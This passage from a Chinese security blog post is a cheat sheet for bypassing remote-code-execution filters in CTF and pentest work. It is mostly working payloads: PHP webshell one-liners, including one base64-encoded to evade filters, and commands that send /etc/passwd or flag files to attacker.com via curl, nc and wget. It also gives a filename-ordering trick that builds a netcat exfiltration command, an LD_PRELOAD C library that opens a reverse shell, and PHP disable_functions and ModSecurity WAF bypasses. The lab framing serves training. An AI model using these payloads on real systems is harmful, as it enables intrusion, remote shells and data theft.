+<h3 id="8-3-写-Webshell"><a href="#8-3-写-Webshell" class="headerlink" title="8.3 写 Webshell"></a>8.3 写 Webshell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&lt;?php @eval(\$_POST[cmd]);?&gt;&quot;</span> &gt; shell.php</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&lt;?=@eval(\$_POST[1]);?&gt;&quot;</span> &gt; 1.php      <span class="comment"># 更短的写法</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Base64 编码 + tee：先编码绕过滤，解码后 tee 写入</span></span><br><span class="line"><span class="comment"># &lt;?php eval($_POST[z]);?&gt;   base64编码后得到 PD9waHAgZXZhbCgkX1BPU1Rbel0pOz8+</span></span><br><span class="line"><span class="comment"># echo PD9waHAgZXZhbCgkX1BPU1Rbel0pOz8+ | base64 -d | tee z.php</span></span><br><span class="line">127.0.0.1;<span class="built_in">echo</span> PD9waHAgZXZhbCgkX1BPU1Rbel0pOz8+|<span class="built_in">base64</span> -d |<span class="built_in">tee</span> z.php</span><br></pre></td></tr></table></figure>
+
+<h3 id="8-4-外带文件内容"><a href="#8-4-外带文件内容" class="headerlink" title="8.4 外带文件内容"></a>8.4 外带文件内容</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl http://attacker.com/ -d @/etc/passwd     <span class="comment"># POST 文件内容过去</span></span><br><span class="line">nc attacker.com 8888 &lt; /flag                  <span class="comment"># nc 发送</span></span><br><span class="line">wget http://attacker.com/$(<span class="built_in">cat</span> /flag|<span class="built_in">base64</span>)  <span class="comment"># 藏在 URL 路径里</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="8-5-时间盲注"><a href="#8-5-时间盲注" class="headerlink" title="8.5 时间盲注"></a>8.5 时间盲注</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> [ $(<span class="built_in">cat</span> /flag | <span class="built_in">head</span> -c 1) = <span class="string">&#x27;f&#x27;</span> ]; <span class="keyword">then</span> <span class="built_in">sleep</span> 3; <span class="keyword">fi</span></span><br><span class="line"><span class="built_in">ls</span> /flag | <span class="built_in">cut</span> -c 1 | grep f &amp;&amp; <span class="built_in">sleep</span> 2</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="九、长度限制绕过"><a href="#九、长度限制绕过" class="headerlink" title="九、长度限制绕过"></a>九、长度限制绕过</h2><p>碰到只能执行很短命令的场景（比如 7 个字符限制），用 <code>&gt;</code> 重定向 + <code>ls -t</code> 排序 + <code>sh</code> 执行这套组合拳：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&gt;7777</span><br><span class="line">&gt;\\</span><br><span class="line">&gt;&gt;124\\</span><br><span class="line">&gt;1.\\</span><br><span class="line">&gt;168.\\</span><br><span class="line">&gt;192.\\</span><br><span class="line">&gt;c\\ \\</span><br><span class="line">&gt;\|n\\</span><br><span class="line">&gt;flag\\</span><br><span class="line">&gt;t\\ \\</span><br><span class="line">&gt;ca\\</span><br><span class="line"><span class="built_in">ls</span> -t &gt; a        <span class="comment"># 把上面创建的文件名按时间排序写入 a</span></span><br><span class="line">sh a             <span class="comment"># a 里的内容 = cat flag|nc 192.168.1.124 7777</span></span><br></pre></td></tr></table></figure>
+
+<p>原理：每行 <code>&gt;xxx</code> 创建一个空文件，文件名就是命令片段，<code>ls -t</code> 按创建时间倒序排好，<code>\\</code> 换行续接，最后 <code>sh a</code> 执行。</p>
+<hr>
+<h2 id="十、PHP-disable-functions-突破"><a href="#十、PHP-disable-functions-突破" class="headerlink" title="十、PHP disable_functions 突破"></a>十、PHP disable_functions 突破</h2><p>环境把 <code>system</code>、<code>exec</code> 等禁了不代表没戏。</p>
+<h3 id="10-1-LD-PRELOAD-劫持"><a href="#10-1-LD-PRELOAD-劫持" class="headerlink" title="10.1 LD_PRELOAD 劫持"></a>10.1 LD_PRELOAD 劫持</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// bypass.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line">__attribute__((constructor)) <span class="type">void</span> <span class="title function_">payload</span><span class="params">()</span> &#123;</span><br><span class="line">    unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;bash -c &#x27;exec bash -i &amp;&gt;/dev/tcp/192.168.1.1/7777 &lt;&amp;1&#x27;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>编译 <code>gcc -shared -fPIC bypass.c -o bypass.so</code>，通过 PHP 的 <code>putenv</code> + <code>mail</code> 等调用触发。</p>
+<h3 id="10-2-FFI（PHP-7-4-）"><a href="#10-2-FFI（PHP-7-4-）" class="headerlink" title="10.2 FFI（PHP 7.4+）"></a>10.2 FFI（PHP 7.4+）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ffi</span> = FFI::<span class="title function_ invoke__">cdef</span>(<span class="string">&quot;int system(const char *command);&quot;</span>);</span><br><span class="line"><span class="variable">$ffi</span>-&gt;<span class="title function_ invoke__">system</span>(<span class="string">&quot;whoami&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<h3 id="10-3-COM（Windows）"><a href="#10-3-COM（Windows）" class="headerlink" title="10.3 COM（Windows）"></a>10.3 COM（Windows）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$com</span> = <span class="keyword">new</span> <span class="title function_ invoke__">COM</span>(<span class="string">&#x27;WScript.Shell&#x27;</span>);</span><br><span class="line"><span class="variable">$com</span>-&gt;<span class="title function_ invoke__">exec</span>(<span class="string">&#x27;whoami&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<h3 id="10-4-其他绕过链"><a href="#10-4-其他绕过链" class="headerlink" title="10.4 其他绕过链"></a>10.4 其他绕过链</h3><p>常见：<code>pcntl_exec</code>、<code>imap_open</code>（CVE-2018-19518）、<code>error_log</code> + <code>mail</code> 配合 LD_PRELOAD。</p>
+<hr>
+<h2 id="十一、实战绕过思路"><a href="#十一、实战绕过思路" class="headerlink" title="十一、实战绕过思路"></a>十一、实战绕过思路</h2><h3 id="11-1-分层试探法"><a href="#11-1-分层试探法" class="headerlink" title="11.1 分层试探法"></a>11.1 分层试探法</h3><ol>
+<li>先搞清楚<strong>过滤了什么</strong>（空格？分号？关键字？斜杠？）</li>
+<li>选最省事的绕过（空格 → <code>$IFS</code>，分号 → <code>%0a</code>，关键字 → 引号拼接）</li>
+<li>一层不够再叠一层（编码 + 通配符 + 变量拼接）</li>
+<li>WAF 场景优先用 <code>?</code> 而不是 <code>*</code></li>
+</ol>
+<h3 id="11-2-组合示例"><a href="#11-2-组合示例" class="headerlink" title="11.2 组合示例"></a>11.2 组合示例</h3><p>假设过滤了 <code>| &amp; ; / cat flag</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1%0acd%09dir_name%0atac%09file*.php</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>%0a</code> 替 <code>;</code>（换行分隔命令）</li>
+<li><code>%09</code> 替空格（Tab）</li>
+<li><code>dir_name</code> 用 <code>*_name</code> 等通配符凑</li>
+<li><code>file*.php</code> 通配文件名</li>
+<li><code>tac</code> 替 <code>cat</code></li>
+</ul>
+<h3 id="11-3-ModSecurity-OWASP-CRS"><a href="#11-3-ModSecurity-OWASP-CRS" class="headerlink" title="11.3 ModSecurity &#x2F; OWASP CRS"></a>11.3 ModSecurity &#x2F; OWASP CRS</h3><p>不同 Paranoia Level（PL）绕过难度差异很大：</p>
+<ul>
+<li><strong>PL1-2</strong>：<code>?</code> 通配符 + <code>/</code> 在允许字符集内，通配符绕过成功率不错</li>
+<li><strong>PL3</strong>：检测重复非文字字符（多个 <code>?</code>），少量用仍可过，如 <code>/et?/passw?</code></li>
+<li><strong>PL4</strong>：字符集缩到 <code>a-z A-Z 0-9</code>，常规技巧基本失效，得上编码链</li>
+</ul>
+<hr>
+<h2 id="十二、案例复现参考"><a href="#十二、案例复现参考" class="headerlink" title="十二、案例复现参考"></a>十二、案例复现参考</h2><h3 id="CTFShow-29-39-RCE-系列"><a href="#CTFShow-29-39-RCE-系列" class="headerlink" title="CTFShow 29-39 RCE 系列"></a>CTFShow 29-39 RCE 系列</h3><p>入门级命令执行绕过，从无过滤到逐步加过滤再到各种花式绕过，适合练手。</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/hesysd/article/details/128248256">参考 WP</a></li>
+</ul>
+<h3 id="PbootCMS-RCE-审计"><a href="#PbootCMS-RCE-审计" class="headerlink" title="PbootCMS RCE 审计"></a>PbootCMS RCE 审计</h3><p><code>ParserController.php</code> 中 <code>eval</code> 函数触发点，典型的搜索 → 定位 → 回溯调用链审计流程。</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/HexNy0a/articles/17368095.html">参考1</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/-qing-/p/13494000.html">参考2</a></li>
+</ul>
+<h3 id="靶场练习"><a href="#靶场练习" class="headerlink" title="靶场练习"></a>靶场练习</h3><ul>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/ZhaoSong_/article/details/132377906">Pikachu RCE</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/ZhaoSong_/article/details/132326293">DVWA Command Injection</a></li>
+<li><a href="../../../03-%E5%AE%89%E5%85%A8%E8%B5%84%E6%BA%90/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Struts2/Struts2%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88%E4%B8%8E%E6%A2%B3%E7%90%86.md">Struts2 历史漏洞集合</a></li>
+<li><a href="../../../03-%E5%AE%89%E5%85%A8%E8%B5%84%E6%BA%90/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Fastjson/Fastjson_1.2.47_rce.md">Fastjson 1.2.47 RCE</a></li>
+<li><a href="../../../03-%E5%AE%89%E5%85%A8%E8%B5%84%E6%BA%90/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/log4j/Apache_Log4j_Server_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2017-5645).md">Log4j 反序列化命令执行(CVE-2017-5645)</a></li>
+<li><a href="../../../03-%E5%AE%89%E5%85%A8%E8%B5%84%E6%BA%90/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache/Apache_RocketMQ%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5.md">Apache RocketMQ 命令注入</a></li>
+<li><a href="../../../03-%E5%AE%89%E5%85%A8%E8%B5%84%E6%BA%90/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Weblogic/weblogic-10.3.6-'wls-wsat'-XMLDecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.md">Weblogic XMLDecoder 反序列化</a></li>
+<li><a href="../JAVA%E5%AE%89%E5%85%A8/Shiro%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA.md">Shiro 历史漏洞深入浅出</a></li>
+</ul>
+<hr>
+<h2 id="十三、常用工具"><a href="#十三、常用工具" class="headerlink" title="十三、常用工具"></a>十三、常用工具</h2><ul>
+<li><strong><a target="_blank" rel="noopener" href="https://github.com/chi111i/fuzzshell">fuzzshell</a></strong> — CTF RCE 一把梭，黑名单 → 自动出 payload</li>
+<li><strong><a target="_blank" rel="noopener" href="https://github.com/Marven11/Fenjing">Fenjing</a></strong> — SSTI 自动化绕过 + 利用</li>
+<li><strong>CEYE.io &#x2F; Burp Collaborator</strong> — DNSLog 外带平台</li>
+<li><strong>在线编码转换</strong> — Base64&#x2F;Hex&#x2F;Oct 编码 Payload 生成</li>
+</ul>
+<hr>
+<blockquote>
+<p><strong>总结</strong>：RCE 绕过本质上就是不断试——同一个命令，换不同的字符组合、编码方式、环境特性来表述。多打靶场、多攒字典，比背理论管用得多。</p>
+</blockquote>
+
+        </div>
+          
+        <div class="top-div">
+          <ol class="top-box"><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E4%B8%80%E3%80%81%E6%A6%82%E5%BF%B5%E4%B8%8E%E6%9C%AC%E8%B4%A8"><span class="top-box-text">一、概念与本质</span></a></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E4%BA%8C%E3%80%81%E5%90%84%E8%AF%AD%E8%A8%80%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0%E9%80%9F%E6%9F%A5"><span class="top-box-text">二、各语言危险函数速查</span></a><ol class="top-box-child"><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#2-1-PHP"><span class="top-box-text">2.1 PHP</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#2-2-Python"><span class="top-box-text">2.2 Python</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#2-3-Java-JVM-%E7%94%9F%E6%80%81"><span class="top-box-text">2.3 Java &#x2F; JVM 生态</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#2-4-Node-js-JavaScript"><span class="top-box-text">2.4 Node.js &#x2F; JavaScript</span></a></li></ol></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E4%B8%89%E3%80%81%E5%91%BD%E4%BB%A4%E6%8B%BC%E6%8E%A5%E4%B8%8E%E8%BF%9E%E6%8E%A5%E7%AC%A6"><span class="top-box-text">三、命令拼接与连接符</span></a><ol class="top-box-child"><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#3-1-Linux-Shell"><span class="top-box-text">3.1 Linux Shell</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#3-2-Windows-CMD"><span class="top-box-text">3.2 Windows CMD</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#3-3-%E5%86%85%E8%81%94%E6%89%A7%E8%A1%8C"><span class="top-box-text">3.3 内联执行</span></a></li></ol></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E5%9B%9B%E3%80%81%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="top-box-text">四、空格过滤绕过</span></a></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E4%BA%94%E3%80%81%E5%85%B3%E9%94%AE%E5%AD%97-%E5%87%BD%E6%95%B0%E5%90%8D%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="top-box-text">五、关键字&#x2F;函数名过滤绕过</span></a><ol class="top-box-child"><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#5-1-%E5%BC%95%E5%8F%B7%E5%B9%B2%E6%89%B0"><span class="top-box-text">5.1 引号干扰</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#5-2-%E5%8F%98%E9%87%8F%E6%8B%BC%E6%8E%A5"><span class="top-box-text">5.2 变量拼接</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#5-3-%E9%80%9A%E9%85%8D%E7%AC%A6"><span class="top-box-text">5.3 通配符</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#5-4-%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="top-box-text">5.4 编码绕过</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#5-5-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%88%AA%E5%8F%96"><span class="top-box-text">5.5 环境变量截取</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#5-6-PHP-%E4%B8%93%E5%B1%9E%EF%BC%9A%E5%8F%96%E5%8F%8D-%E5%BC%82%E6%88%96"><span class="top-box-text">5.6 PHP 专属：取反 &#x2F; 异或</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#5-7-%E6%97%A0%E5%8F%82-RCE%EF%BC%88PHP%EF%BC%89"><span class="top-box-text">5.7 无参 RCE（PHP）</span></a></li></ol></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E5%85%AD%E3%80%81cat-%E8%A2%AB%E7%A6%81%E6%97%B6%E7%9A%84%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%9B%BF%E4%BB%A3"><span class="top-box-text">六、cat 被禁时的文件读取替代</span></a></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E4%B8%83%E3%80%81Windows-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%89%B9%E5%88%AB%E7%AF%87"><span class="top-box-text">七、Windows 命令执行特别篇</span></a><ol class="top-box-child"><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#7-1-%E5%8F%8C%E5%BC%95%E5%8F%B7-%E5%B9%B2%E6%89%B0"><span class="top-box-text">7.1 双引号 + ^ 干扰</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#7-2-set-%E5%8F%98%E9%87%8F%E6%8B%BC%E6%8E%A5"><span class="top-box-text">7.2 set 变量拼接</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#7-3-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%81%B7%E7%A9%BA%E6%A0%BC"><span class="top-box-text">7.3 环境变量偷空格</span></a></li></ol></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E5%85%AB%E3%80%81%E6%97%A0%E5%9B%9E%E6%98%BE-RCE"><span class="top-box-text">八、无回显 RCE</span></a><ol class="top-box-child"><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#8-1-DNSLog-%E5%A4%96%E5%B8%A6"><span class="top-box-text">8.1 DNSLog 外带</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#8-2-%E5%8F%8D%E5%BC%B9-Shell"><span class="top-box-text">8.2 反弹 Shell</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#8-3-%E5%86%99-Webshell"><span class="top-box-text">8.3 写 Webshell</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#8-4-%E5%A4%96%E5%B8%A6%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9"><span class="top-box-text">8.4 外带文件内容</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#8-5-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="top-box-text">8.5 时间盲注</span></a></li></ol></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E4%B9%9D%E3%80%81%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87"><span class="top-box-text">九、长度限制绕过</span></a></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E5%8D%81%E3%80%81PHP-disable-functions-%E7%AA%81%E7%A0%B4"><span class="top-box-text">十、PHP disable_functions 突破</span></a><ol class="top-box-child"><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#10-1-LD-PRELOAD-%E5%8A%AB%E6%8C%81"><span class="top-box-text">10.1 LD_PRELOAD 劫持</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#10-2-FFI%EF%BC%88PHP-7-4-%EF%BC%89"><span class="top-box-text">10.2 FFI（PHP 7.4+）</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#10-3-COM%EF%BC%88Windows%EF%BC%89"><span class="top-box-text">10.3 COM（Windows）</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#10-4-%E5%85%B6%E4%BB%96%E7%BB%95%E8%BF%87%E9%93%BE"><span class="top-box-text">10.4 其他绕过链</span></a></li></ol></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E5%8D%81%E4%B8%80%E3%80%81%E5%AE%9E%E6%88%98%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF"><span class="top-box-text">十一、实战绕过思路</span></a><ol class="top-box-child"><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#11-1-%E5%88%86%E5%B1%82%E8%AF%95%E6%8E%A2%E6%B3%95"><span class="top-box-text">11.1 分层试探法</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#11-2-%E7%BB%84%E5%90%88%E7%A4%BA%E4%BE%8B"><span class="top-box-text">11.2 组合示例</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#11-3-ModSecurity-OWASP-CRS"><span class="top-box-text">11.3 ModSecurity &#x2F; OWASP CRS</span></a></li></ol></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E5%8D%81%E4%BA%8C%E3%80%81%E6%A1%88%E4%BE%8B%E5%A4%8D%E7%8E%B0%E5%8F%82%E8%80%83"><span class="top-box-text">十二、案例复现参考</span></a><ol class="top-box-child"><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#CTFShow-29-39-RCE-%E7%B3%BB%E5%88%97"><span class="top-box-text">CTFShow 29-39 RCE 系列</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#PbootCMS-RCE-%E5%AE%A1%E8%AE%A1"><span class="top-box-text">PbootCMS RCE 审计</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0"><span class="top-box-text">靶场练习</span></a></li></ol></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E5%8D%81%E4%B8%89%E3%80%81%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7"><span class="top-box-text">十三、常用工具</span></a></li></ol>
+        </div>
+          
+      </div>
+    </div>
+
+    
+      <div class="next-post">
+        <a class="purple-link" href="/2025/08/14/wechat-service-account-capture/">
+          <h3 class="post-title">
+            
+            下一篇：服务号渗透测试抓包问题解决(使用Burpsuite抓取手机app数据)
+          </h3>
+        </a>
+      </div>
+    
+  </div>
+
+
+
+
+
+
+
+<footer>
+<div class="site-footer">
+  <div class="social-container">
+    
+      
+        <a aria-label="跳转至github" href="https://github.com/z50n6" target="_blank">
+          <i class="icon icon-github"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+  
+    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> <a href="https://github.com/f-dong/hexo-theme-minimalism" target="_blank">Theme</a>
+  
+  
+  
+    
+     |
+    
+      <a href="/atom.xml" target="_blank">RSS</a>
+  
+  
+  
+  
+</div>
+</footer>
+
+
+      </div>
+    </div>
+    
+<script id="hexo-configurations"> window.theme_config = {"image":{"lazyload_enable":true,"lazyload_placeholder":null,"photo_zoom":"simple-lightbox"},"search":{"enable":true,"type":"json","placeholder":"输入关键词搜索...","algolia":{"appID":"","apiKey":"","indexName":""}},"language":"zh-CN"}; window.is_post = true; </script>
+
+<script src="/js/main.js"></script>
+
+
+
+
+
+
+  </body>
+</html>
+
